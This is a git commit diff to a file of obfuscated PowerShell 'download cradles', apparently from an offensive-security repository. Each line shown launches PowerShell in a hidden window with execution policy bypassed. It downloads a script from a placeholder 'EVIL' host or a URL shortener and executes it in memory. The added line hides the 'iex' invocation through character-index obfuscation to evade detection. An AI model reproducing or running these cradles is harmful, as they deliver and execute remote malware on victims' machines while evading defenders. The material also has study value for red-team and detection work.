82260baa214f3d7ca0ce84c2129642e097856cdf
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-25 19:10:27 +0100

    Update Download-Cradles.cmd

--- Download-Cradles.cmd
+++ Download-Cradles.cmd
@@ -8,6 +8,7 @@ cmd> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRsheLl -WiNDOW  HIddEN -eXECUTI  BYpaSS  -
 cmd> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
 cmd> pOWERShELl -NopROFi -wIN hidd -EXEcutiOnPoLiC BYpAsS  -COm    "$url='https://cutt.ly/WS8Vek5';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';$wc.$ds.Invoke($url)|Invoke-Expression"
 cmd> POWERShelL  -W  hId -eXECuTionpoLIC BYPaSS  -NOprOfiLe -cOmMA    "$url='https://cutt.ly/WS8Vek5';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';IEX($wc.$ds.Invoke($url))"
+cmd> POWeRsHeLl -cO   "&( ([String]''.Normalize)[23,15,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://EVIL/payload.ps1'))-Join'')"
 
 
 # Proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
